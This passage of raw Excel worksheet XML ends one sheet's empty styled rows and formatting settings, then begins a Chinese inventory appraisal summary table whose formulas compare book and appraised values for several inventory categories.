      <c r="J54" s="347" t="n"/>
      <c r="K54" s="347" t="n"/>
      <c r="L54" s="347" t="n"/>
      <c r="M54" s="347" t="n"/>
      <c r="N54" s="347" t="n"/>
      <c r="O54" s="347" t="n"/>
      <c r="P54" s="347" t="n"/>
      <c r="Q54" s="347" t="n"/>
      <c r="R54" s="347" t="n"/>
      <c r="S54" s="322" t="n"/>
    </row>
    <row r="55" s="415">
      <c r="A55" s="347" t="n"/>
      <c r="B55" s="347" t="n"/>
      <c r="C55" s="347" t="n"/>
      <c r="D55" s="347" t="n"/>
      <c r="E55" s="347" t="n"/>
      <c r="F55" s="347" t="n"/>
      <c r="G55" s="347" t="n"/>
      <c r="H55" s="347" t="n"/>
      <c r="I55" s="347" t="n"/>
      <c r="J55" s="347" t="n"/>
      <c r="K55" s="347" t="n"/>
      <c r="L55" s="347" t="n"/>
      <c r="M55" s="347" t="n"/>
      <c r="N55" s="347" t="n"/>
      <c r="O55" s="347" t="n"/>
      <c r="P55" s="347" t="n"/>
      <c r="Q55" s="347" t="n"/>
      <c r="R55" s="347" t="n"/>
      <c r="S55" s="322" t="n"/>
    </row>
    <row r="56" s="415">
      <c r="A56" s="347" t="n"/>
      <c r="B56" s="347" t="n"/>
      <c r="C56" s="347" t="n"/>
      <c r="D56" s="347" t="n"/>
      <c r="E56" s="347" t="n"/>
      <c r="F56" s="347" t="n"/>
      <c r="G56" s="347" t="n"/>
      <c r="H56" s="347" t="n"/>
      <c r="I56" s="347" t="n"/>
      <c r="J56" s="347" t="n"/>
      <c r="K56" s="347" t="n"/>
      <c r="L56" s="347" t="n"/>
      <c r="M56" s="347" t="n"/>
      <c r="N56" s="347" t="n"/>
      <c r="O56" s="347" t="n"/>
      <c r="P56" s="347" t="n"/>
      <c r="Q56" s="347" t="n"/>
      <c r="R56" s="347" t="n"/>
      <c r="S56" s="322" t="n"/>
    </row>
    <row r="57" s="415">
      <c r="A57" s="347" t="n"/>
      <c r="B57" s="347" t="n"/>
      <c r="C57" s="347" t="n"/>
      <c r="D57" s="347" t="n"/>
      <c r="E57" s="347" t="n"/>
      <c r="F57" s="347" t="n"/>
      <c r="G57" s="347" t="n"/>
      <c r="H57" s="347" t="n"/>
      <c r="I57" s="347" t="n"/>
      <c r="J57" s="347" t="n"/>
      <c r="K57" s="347" t="n"/>
      <c r="L57" s="347" t="n"/>
      <c r="M57" s="347" t="n"/>
      <c r="N57" s="347" t="n"/>
      <c r="O57" s="347" t="n"/>
      <c r="P57" s="347" t="n"/>
      <c r="Q57" s="347" t="n"/>
      <c r="R57" s="347" t="n"/>
      <c r="S57" s="322" t="n"/>
    </row>
    <row r="58" s="415">
      <c r="A58" s="347" t="n"/>
      <c r="B58" s="347" t="n"/>
      <c r="C58" s="347" t="n"/>
      <c r="D58" s="347" t="n"/>
      <c r="E58" s="347" t="n"/>
      <c r="F58" s="347" t="n"/>
      <c r="G58" s="347" t="n"/>
      <c r="H58" s="347" t="n"/>
      <c r="I58" s="347" t="n"/>
      <c r="J58" s="347" t="n"/>
      <c r="K58" s="347" t="n"/>
      <c r="L58" s="347" t="n"/>
      <c r="M58" s="347" t="n"/>
      <c r="N58" s="347" t="n"/>
      <c r="O58" s="347" t="n"/>
      <c r="P58" s="347" t="n"/>
      <c r="Q58" s="347" t="n"/>
      <c r="R58" s="347" t="n"/>
      <c r="S58" s="322" t="n"/>
    </row>
    <row r="59" s="415">
      <c r="A59" s="347" t="n"/>
      <c r="B59" s="347" t="n"/>
      <c r="C59" s="347" t="n"/>
      <c r="D59" s="347" t="n"/>
      <c r="E59" s="347" t="n"/>
      <c r="F59" s="347" t="n"/>
      <c r="G59" s="347" t="n"/>
      <c r="H59" s="347" t="n"/>
      <c r="I59" s="347" t="n"/>
      <c r="J59" s="347" t="n"/>
      <c r="K59" s="347" t="n"/>
      <c r="L59" s="347" t="n"/>
      <c r="M59" s="347" t="n"/>
      <c r="N59" s="347" t="n"/>
      <c r="O59" s="347" t="n"/>
      <c r="P59" s="347" t="n"/>
      <c r="Q59" s="347" t="n"/>
      <c r="R59" s="347" t="n"/>
      <c r="S59" s="322" t="n"/>
    </row>
    <row r="60" s="415">
      <c r="A60" s="347" t="n"/>
      <c r="B60" s="347" t="n"/>
      <c r="C60" s="347" t="n"/>
      <c r="D60" s="347" t="n"/>
      <c r="E60" s="347" t="n"/>
      <c r="F60" s="347" t="n"/>
      <c r="G60" s="347" t="n"/>
      <c r="H60" s="347" t="n"/>
      <c r="I60" s="347" t="n"/>
      <c r="J60" s="347" t="n"/>
      <c r="K60" s="347" t="n"/>
      <c r="L60" s="347" t="n"/>
      <c r="M60" s="347" t="n"/>
      <c r="N60" s="347" t="n"/>
      <c r="O60" s="347" t="n"/>
      <c r="P60" s="347" t="n"/>
      <c r="Q60" s="347" t="n"/>
      <c r="R60" s="347" t="n"/>
      <c r="S60" s="322" t="n"/>
    </row>
    <row r="61" s="415">
      <c r="A61" s="347" t="n"/>
      <c r="B61" s="347" t="n"/>
      <c r="C61" s="347" t="n"/>
      <c r="D61" s="347" t="n"/>
      <c r="E61" s="347" t="n"/>
      <c r="F61" s="347" t="n"/>
      <c r="G61" s="347" t="n"/>
      <c r="H61" s="347" t="n"/>
      <c r="I61" s="347" t="n"/>
      <c r="J61" s="347" t="n"/>
      <c r="K61" s="347" t="n"/>
      <c r="L61" s="347" t="n"/>
      <c r="M61" s="347" t="n"/>
      <c r="N61" s="347" t="n"/>
      <c r="O61" s="347" t="n"/>
      <c r="P61" s="347" t="n"/>
      <c r="Q61" s="347" t="n"/>
      <c r="R61" s="347" t="n"/>
      <c r="S61" s="322" t="n"/>
    </row>
    <row r="62" s="415">
      <c r="A62" s="347" t="n"/>
      <c r="B62" s="347" t="n"/>
      <c r="C62" s="347" t="n"/>
      <c r="D62" s="347" t="n"/>
      <c r="E62" s="347" t="n"/>
      <c r="F62" s="347" t="n"/>
      <c r="G62" s="347" t="n"/>
      <c r="H62" s="347" t="n"/>
      <c r="I62" s="347" t="n"/>
      <c r="J62" s="347" t="n"/>
      <c r="K62" s="347" t="n"/>
      <c r="L62" s="347" t="n"/>
      <c r="M62" s="347" t="n"/>
      <c r="N62" s="347" t="n"/>
      <c r="O62" s="347" t="n"/>
      <c r="P62" s="347" t="n"/>
      <c r="Q62" s="347" t="n"/>
      <c r="R62" s="347" t="n"/>
      <c r="S62" s="322" t="n"/>
    </row>
    <row r="63" s="415">
      <c r="A63" s="347" t="n"/>
      <c r="B63" s="347" t="n"/>
      <c r="C63" s="347" t="n"/>
      <c r="D63" s="347" t="n"/>
      <c r="E63" s="347" t="n"/>
      <c r="F63" s="347" t="n"/>
      <c r="G63" s="347" t="n"/>
      <c r="H63" s="347" t="n"/>
      <c r="I63" s="347" t="n"/>
      <c r="J63" s="347" t="n"/>
      <c r="K63" s="347" t="n"/>
      <c r="L63" s="347" t="n"/>
      <c r="M63" s="347" t="n"/>
      <c r="N63" s="347" t="n"/>
      <c r="O63" s="347" t="n"/>
      <c r="P63" s="347" t="n"/>
      <c r="Q63" s="347" t="n"/>
      <c r="R63" s="347" t="n"/>
      <c r="S63" s="322" t="n"/>
    </row>
    <row r="64" s="415">
      <c r="A64" s="347" t="n"/>
      <c r="B64" s="347" t="n"/>
      <c r="C64" s="347" t="n"/>
      <c r="D64" s="347" t="n"/>
      <c r="E64" s="347" t="n"/>
      <c r="F64" s="347" t="n"/>
      <c r="G64" s="347" t="n"/>
      <c r="H64" s="347" t="n"/>
      <c r="I64" s="347" t="n"/>
      <c r="J64" s="347" t="n"/>
      <c r="K64" s="347" t="n"/>
      <c r="L64" s="347" t="n"/>
      <c r="M64" s="347" t="n"/>
      <c r="N64" s="347" t="n"/>
      <c r="O64" s="347" t="n"/>
      <c r="P64" s="347" t="n"/>
      <c r="Q64" s="347" t="n"/>
      <c r="R64" s="347" t="n"/>
      <c r="S64" s="322" t="n"/>
    </row>
    <row r="65" s="415">
      <c r="A65" s="347" t="n"/>
      <c r="B65" s="347" t="n"/>
      <c r="C65" s="347" t="n"/>
      <c r="D65" s="347" t="n"/>
      <c r="E65" s="347" t="n"/>
      <c r="F65" s="347" t="n"/>
      <c r="G65" s="347" t="n"/>
      <c r="H65" s="347" t="n"/>
      <c r="I65" s="347" t="n"/>
      <c r="J65" s="347" t="n"/>
      <c r="K65" s="347" t="n"/>
      <c r="L65" s="347" t="n"/>
      <c r="M65" s="347" t="n"/>
      <c r="N65" s="347" t="n"/>
      <c r="O65" s="347" t="n"/>
      <c r="P65" s="347" t="n"/>
      <c r="Q65" s="347" t="n"/>
      <c r="R65" s="347" t="n"/>
      <c r="S65" s="322" t="n"/>
    </row>
    <row r="66" s="415">
      <c r="A66" s="347" t="n"/>
      <c r="B66" s="347" t="n"/>
      <c r="C66" s="347" t="n"/>
      <c r="D66" s="347" t="n"/>
      <c r="E66" s="347" t="n"/>
      <c r="F66" s="347" t="n"/>
      <c r="G66" s="347" t="n"/>
      <c r="H66" s="347" t="n"/>
      <c r="I66" s="347" t="n"/>
      <c r="J66" s="347" t="n"/>
      <c r="K66" s="347" t="n"/>
      <c r="L66" s="347" t="n"/>
      <c r="M66" s="347" t="n"/>
      <c r="N66" s="347" t="n"/>
      <c r="O66" s="347" t="n"/>
      <c r="P66" s="347" t="n"/>
      <c r="Q66" s="347" t="n"/>
      <c r="R66" s="347" t="n"/>
      <c r="S66" s="322" t="n"/>
    </row>
    <row r="67" s="415">
      <c r="A67" s="347" t="n"/>
      <c r="B67" s="347" t="n"/>
      <c r="C67" s="347" t="n"/>
      <c r="D67" s="347" t="n"/>
      <c r="E67" s="347" t="n"/>
      <c r="F67" s="347" t="n"/>
      <c r="G67" s="347" t="n"/>
      <c r="H67" s="347" t="n"/>
      <c r="I67" s="347" t="n"/>
      <c r="J67" s="347" t="n"/>
      <c r="K67" s="347" t="n"/>
      <c r="L67" s="347" t="n"/>
      <c r="M67" s="347" t="n"/>
      <c r="N67" s="347" t="n"/>
      <c r="O67" s="347" t="n"/>
      <c r="P67" s="347" t="n"/>
      <c r="Q67" s="347" t="n"/>
      <c r="R67" s="347" t="n"/>
      <c r="S67" s="322" t="n"/>
    </row>
    <row r="68" s="415">
      <c r="A68" s="341" t="n"/>
      <c r="B68" s="341" t="n"/>
      <c r="C68" s="341" t="n"/>
      <c r="D68" s="341" t="n"/>
      <c r="E68" s="341" t="n"/>
      <c r="F68" s="341" t="n"/>
      <c r="G68" s="341" t="n"/>
      <c r="H68" s="341" t="n"/>
      <c r="I68" s="341" t="n"/>
      <c r="J68" s="341" t="n"/>
      <c r="K68" s="341" t="n"/>
      <c r="L68" s="341" t="n"/>
      <c r="M68" s="341" t="n"/>
      <c r="N68" s="341" t="n"/>
      <c r="O68" s="341" t="n"/>
      <c r="P68" s="341" t="n"/>
      <c r="Q68" s="341" t="n"/>
      <c r="R68" s="341" t="n"/>
      <c r="S68" s="322" t="n"/>
    </row>
    <row r="69" s="415">
      <c r="A69" s="341" t="n"/>
      <c r="B69" s="341" t="n"/>
      <c r="C69" s="341" t="n"/>
      <c r="D69" s="341" t="n"/>
      <c r="E69" s="341" t="n"/>
      <c r="F69" s="341" t="n"/>
      <c r="G69" s="341" t="n"/>
      <c r="H69" s="341" t="n"/>
      <c r="I69" s="341" t="n"/>
      <c r="J69" s="341" t="n"/>
      <c r="K69" s="341" t="n"/>
      <c r="L69" s="341" t="n"/>
      <c r="M69" s="341" t="n"/>
      <c r="N69" s="341" t="n"/>
      <c r="O69" s="341" t="n"/>
      <c r="P69" s="341" t="n"/>
      <c r="Q69" s="341" t="n"/>
      <c r="R69" s="341" t="n"/>
      <c r="S69" s="322" t="n"/>
    </row>
    <row r="70" s="415">
      <c r="A70" s="341" t="n"/>
      <c r="B70" s="341" t="n"/>
      <c r="C70" s="341" t="n"/>
      <c r="D70" s="341" t="n"/>
      <c r="E70" s="341" t="n"/>
      <c r="F70" s="341" t="n"/>
      <c r="G70" s="341" t="n"/>
      <c r="H70" s="341" t="n"/>
      <c r="I70" s="341" t="n"/>
      <c r="J70" s="341" t="n"/>
      <c r="K70" s="341" t="n"/>
      <c r="L70" s="341" t="n"/>
      <c r="M70" s="341" t="n"/>
      <c r="N70" s="341" t="n"/>
      <c r="O70" s="341" t="n"/>
      <c r="P70" s="341" t="n"/>
      <c r="Q70" s="341" t="n"/>
      <c r="R70" s="341" t="n"/>
      <c r="S70" s="322" t="n"/>
    </row>
    <row r="71" s="415">
      <c r="A71" s="341" t="n"/>
      <c r="B71" s="341" t="n"/>
      <c r="C71" s="341" t="n"/>
      <c r="D71" s="341" t="n"/>
      <c r="E71" s="341" t="n"/>
      <c r="F71" s="341" t="n"/>
      <c r="G71" s="341" t="n"/>
      <c r="H71" s="341" t="n"/>
      <c r="I71" s="341" t="n"/>
      <c r="J71" s="341" t="n"/>
      <c r="K71" s="341" t="n"/>
      <c r="L71" s="341" t="n"/>
      <c r="M71" s="341" t="n"/>
      <c r="N71" s="341" t="n"/>
      <c r="O71" s="341" t="n"/>
      <c r="P71" s="341" t="n"/>
      <c r="Q71" s="341" t="n"/>
      <c r="R71" s="341" t="n"/>
      <c r="S71" s="322" t="n"/>
    </row>
    <row r="72" s="415">
      <c r="A72" s="341" t="n"/>
      <c r="B72" s="341" t="n"/>
      <c r="C72" s="341" t="n"/>
      <c r="D72" s="341" t="n"/>
      <c r="E72" s="341" t="n"/>
      <c r="F72" s="341" t="n"/>
      <c r="G72" s="341" t="n"/>
      <c r="H72" s="341" t="n"/>
      <c r="I72" s="341" t="n"/>
      <c r="J72" s="341" t="n"/>
      <c r="K72" s="341" t="n"/>
      <c r="L72" s="341" t="n"/>
      <c r="M72" s="341" t="n"/>
      <c r="N72" s="341" t="n"/>
      <c r="O72" s="341" t="n"/>
      <c r="P72" s="341" t="n"/>
      <c r="Q72" s="341" t="n"/>
      <c r="R72" s="341" t="n"/>
      <c r="S72" s="322" t="n"/>
    </row>
    <row r="73" s="415">
      <c r="A73" s="342" t="n"/>
      <c r="B73" s="342" t="n"/>
      <c r="C73" s="342" t="n"/>
      <c r="D73" s="342" t="n"/>
      <c r="E73" s="342" t="n"/>
      <c r="F73" s="342" t="n"/>
      <c r="G73" s="342" t="n"/>
      <c r="H73" s="342" t="n"/>
      <c r="I73" s="342" t="n"/>
      <c r="J73" s="342" t="n"/>
      <c r="K73" s="342" t="n"/>
      <c r="L73" s="342" t="n"/>
      <c r="M73" s="342" t="n"/>
      <c r="N73" s="342" t="n"/>
      <c r="O73" s="342" t="n"/>
      <c r="P73" s="342" t="n"/>
      <c r="Q73" s="342" t="n"/>
      <c r="R73" s="342" t="n"/>
    </row>
    <row r="74" s="415">
      <c r="A74" s="342" t="n"/>
      <c r="B74" s="342" t="n"/>
      <c r="C74" s="342" t="n"/>
      <c r="D74" s="342" t="n"/>
      <c r="E74" s="342" t="n"/>
      <c r="F74" s="342" t="n"/>
      <c r="G74" s="342" t="n"/>
      <c r="H74" s="342" t="n"/>
      <c r="I74" s="342" t="n"/>
      <c r="J74" s="342" t="n"/>
      <c r="K74" s="342" t="n"/>
      <c r="L74" s="342" t="n"/>
      <c r="M74" s="342" t="n"/>
      <c r="N74" s="342" t="n"/>
      <c r="O74" s="342" t="n"/>
      <c r="P74" s="342" t="n"/>
      <c r="Q74" s="342" t="n"/>
      <c r="R74" s="342" t="n"/>
    </row>
    <row r="75" s="415">
      <c r="A75" s="342" t="n"/>
      <c r="B75" s="342" t="n"/>
      <c r="C75" s="342" t="n"/>
      <c r="D75" s="342" t="n"/>
      <c r="E75" s="342" t="n"/>
      <c r="F75" s="342" t="n"/>
      <c r="G75" s="342" t="n"/>
      <c r="H75" s="342" t="n"/>
      <c r="I75" s="342" t="n"/>
      <c r="J75" s="342" t="n"/>
      <c r="K75" s="342" t="n"/>
      <c r="L75" s="342" t="n"/>
      <c r="M75" s="342" t="n"/>
      <c r="N75" s="342" t="n"/>
      <c r="O75" s="342" t="n"/>
      <c r="P75" s="342" t="n"/>
      <c r="Q75" s="342" t="n"/>
      <c r="R75" s="342" t="n"/>
    </row>
    <row r="76" s="415">
      <c r="A76" s="342" t="n"/>
      <c r="B76" s="342" t="n"/>
      <c r="C76" s="342" t="n"/>
      <c r="D76" s="342" t="n"/>
      <c r="E76" s="342" t="n"/>
      <c r="F76" s="342" t="n"/>
      <c r="G76" s="342" t="n"/>
      <c r="H76" s="342" t="n"/>
      <c r="I76" s="342" t="n"/>
      <c r="J76" s="342" t="n"/>
      <c r="K76" s="342" t="n"/>
      <c r="L76" s="342" t="n"/>
      <c r="M76" s="342" t="n"/>
      <c r="N76" s="342" t="n"/>
      <c r="O76" s="342" t="n"/>
      <c r="P76" s="342" t="n"/>
      <c r="Q76" s="342" t="n"/>
      <c r="R76" s="342" t="n"/>
    </row>
    <row r="77" s="415">
      <c r="A77" s="342" t="n"/>
      <c r="B77" s="342" t="n"/>
      <c r="C77" s="342" t="n"/>
      <c r="D77" s="342" t="n"/>
      <c r="E77" s="342" t="n"/>
      <c r="F77" s="342" t="n"/>
      <c r="G77" s="342" t="n"/>
      <c r="H77" s="342" t="n"/>
      <c r="I77" s="342" t="n"/>
      <c r="J77" s="342" t="n"/>
      <c r="K77" s="342" t="n"/>
      <c r="L77" s="342" t="n"/>
      <c r="M77" s="342" t="n"/>
      <c r="N77" s="342" t="n"/>
      <c r="O77" s="342" t="n"/>
      <c r="P77" s="342" t="n"/>
      <c r="Q77" s="342" t="n"/>
      <c r="R77" s="342" t="n"/>
    </row>
    <row r="78" s="415">
      <c r="A78" s="342" t="n"/>
      <c r="B78" s="342" t="n"/>
      <c r="C78" s="342" t="n"/>
      <c r="D78" s="342" t="n"/>
      <c r="E78" s="342" t="n"/>
      <c r="F78" s="342" t="n"/>
      <c r="G78" s="342" t="n"/>
      <c r="H78" s="342" t="n"/>
      <c r="I78" s="342" t="n"/>
      <c r="J78" s="342" t="n"/>
      <c r="K78" s="342" t="n"/>
      <c r="L78" s="342" t="n"/>
      <c r="M78" s="342" t="n"/>
      <c r="N78" s="342" t="n"/>
      <c r="O78" s="342" t="n"/>
      <c r="P78" s="342" t="n"/>
      <c r="Q78" s="342" t="n"/>
      <c r="R78" s="342" t="n"/>
    </row>
    <row r="79" s="415">
      <c r="A79" s="342" t="n"/>
      <c r="B79" s="342" t="n"/>
      <c r="C79" s="342" t="n"/>
      <c r="D79" s="342" t="n"/>
      <c r="E79" s="342" t="n"/>
      <c r="F79" s="342" t="n"/>
      <c r="G79" s="342" t="n"/>
      <c r="H79" s="342" t="n"/>
      <c r="I79" s="342" t="n"/>
      <c r="J79" s="342" t="n"/>
      <c r="K79" s="342" t="n"/>
      <c r="L79" s="342" t="n"/>
      <c r="M79" s="342" t="n"/>
      <c r="N79" s="342" t="n"/>
      <c r="O79" s="342" t="n"/>
      <c r="P79" s="342" t="n"/>
      <c r="Q79" s="342" t="n"/>
      <c r="R79" s="342" t="n"/>
    </row>
    <row r="80" s="415">
      <c r="A80" s="342" t="n"/>
      <c r="B80" s="342" t="n"/>
      <c r="C80" s="342" t="n"/>
      <c r="D80" s="342" t="n"/>
      <c r="E80" s="342" t="n"/>
      <c r="F80" s="342" t="n"/>
      <c r="G80" s="342" t="n"/>
      <c r="H80" s="342" t="n"/>
      <c r="I80" s="342" t="n"/>
      <c r="J80" s="342" t="n"/>
      <c r="K80" s="342" t="n"/>
      <c r="L80" s="342" t="n"/>
      <c r="M80" s="342" t="n"/>
      <c r="N80" s="342" t="n"/>
      <c r="O80" s="342" t="n"/>
      <c r="P80" s="342" t="n"/>
      <c r="Q80" s="342" t="n"/>
      <c r="R80" s="342" t="n"/>
    </row>
    <row r="81" s="415">
      <c r="A81" s="342" t="n"/>
      <c r="B81" s="342" t="n"/>
      <c r="C81" s="342" t="n"/>
      <c r="D81" s="342" t="n"/>
      <c r="E81" s="342" t="n"/>
      <c r="F81" s="342" t="n"/>
      <c r="G81" s="342" t="n"/>
      <c r="H81" s="342" t="n"/>
      <c r="I81" s="342" t="n"/>
      <c r="J81" s="342" t="n"/>
      <c r="K81" s="342" t="n"/>
      <c r="L81" s="342" t="n"/>
      <c r="M81" s="342" t="n"/>
      <c r="N81" s="342" t="n"/>
      <c r="O81" s="342" t="n"/>
      <c r="P81" s="342" t="n"/>
      <c r="Q81" s="342" t="n"/>
      <c r="R81" s="342" t="n"/>
    </row>
    <row r="82" s="415">
      <c r="A82" s="342" t="n"/>
      <c r="B82" s="342" t="n"/>
      <c r="C82" s="342" t="n"/>
      <c r="D82" s="342" t="n"/>
      <c r="E82" s="342" t="n"/>
      <c r="F82" s="342" t="n"/>
      <c r="G82" s="342" t="n"/>
      <c r="H82" s="342" t="n"/>
      <c r="I82" s="342" t="n"/>
      <c r="J82" s="342" t="n"/>
      <c r="K82" s="342" t="n"/>
      <c r="L82" s="342" t="n"/>
      <c r="M82" s="342" t="n"/>
      <c r="N82" s="342" t="n"/>
      <c r="O82" s="342" t="n"/>
      <c r="P82" s="342" t="n"/>
      <c r="Q82" s="342" t="n"/>
      <c r="R82" s="342" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="A1:I1"/>
    <mergeCell ref="G24:I24"/>
    <mergeCell ref="A2:I2"/>
  </mergeCells>
  <conditionalFormatting sqref="A5:I24">
    <cfRule type="expression" priority="3" dxfId="3">
      <formula>_xlfn.ISFORMULA(A5)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="A33:G40">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(A33)</formula>
    </cfRule>
  </conditionalFormatting>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="89" fitToHeight="0" blackAndWhite="1"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet29.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet27">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:L24"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A3" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="F31" sqref="F31"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="6.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="14.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col outlineLevel="1" width="19.1666666666667" customWidth="1" style="410" min="6" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>存货评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customHeight="1" s="415">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="376" t="n"/>
      <c r="J2" s="376" t="n"/>
      <c r="K2" s="376" t="n"/>
    </row>
    <row r="3" ht="16.5" customHeight="1" s="415">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表3-9</t>
        </is>
      </c>
      <c r="I3" s="376" t="n"/>
      <c r="J3" s="376" t="n"/>
      <c r="K3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="571" t="n"/>
      <c r="D4" s="571" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
    </row>
    <row r="5" ht="23.25" customFormat="1" customHeight="1" s="290">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="185" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="344" t="n"/>
      <c r="J5" s="344" t="n"/>
      <c r="K5" s="344" t="n"/>
      <c r="L5" s="292" t="n"/>
    </row>
    <row r="6" ht="17.25" customHeight="1" s="415">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="C6" s="397" t="inlineStr">
        <is>
          <t>存货采购</t>
        </is>
      </c>
      <c r="D6" s="157" t="inlineStr">
        <is>
          <t>在途物资</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'3-9-1在途物资'!G28</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'3-9-1在途物资'!J28</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="347" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="347" t="n"/>
      <c r="L6" s="322" t="n"/>
    </row>
    <row r="7" ht="17.25" customHeight="1" s="415">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>3-9-2</t>
        </is>
      </c>
      <c r="C7" s="397" t="inlineStr">
        <is>
          <t>存货原材</t>
        </is>
      </c>
      <c r="D7" s="182" t="inlineStr">
        <is>
          <t>原材料</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'3-9-2原材料'!H28</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'3-9-2原材料'!K28</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="347" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="347" t="n"/>
      <c r="L7" s="322" t="n"/>
    </row>
    <row r="8" ht="17.25" customHeight="1" s="415">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>3-9-3</t>
        </is>
      </c>
      <c r="C8" s="397" t="inlineStr">
        <is>
          <t>存货在库</t>
        </is>
      </c>
      <c r="D8" s="182" t="inlineStr">
        <is>
          <t>在库周转材料</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'3-9-3在库周转材料'!H28</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'3-9-3在库周转材料'!K28</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="347" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="347" t="n"/>
      <c r="L8" s="322" t="n"/>
    </row>
    <row r="9" ht="17.25" customHeight="1" s="415">
      <c r="B9" s="284" t="inlineStr">
        <is>
          <t>3-9-4</t>
        </is>
      </c>
      <c r="C9" s="397" t="inlineStr">
        <is>
          <t>存货委加</t>
        </is>
      </c>
      <c r="D9" s="182" t="inlineStr">
        <is>
          <t>委托加工物资</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>'3-9-4委托加工物资'!H28</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'3-9-4委托加工物资'!K28</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="347" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="347" t="n"/>
      <c r="L9" s="322" t="n"/>
    </row>
    <row r="10" ht="17.25" customHeight="1" s="415">
      <c r="B10" s="284" t="inlineStr">
        <is>
          <t>3-9-5</t>
        </is>
      </c>
      <c r="C10" s="397" t="inlineStr">
        <is>
          <t>存货产成</t>
        </is>
      </c>
      <c r="D10" s="182" t="inlineStr">
        <is>
          <t>产成品（库存商品）</t>
        </is>
      </c>
      <c r="E10" s="555">
        <f>'3-9-5产成品（库存商品）'!H28</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>'3-9-5产成品（库存商品）'!L28</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="347" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="347" t="n"/>
      <c r="L10" s="322" t="n"/>
    </row>
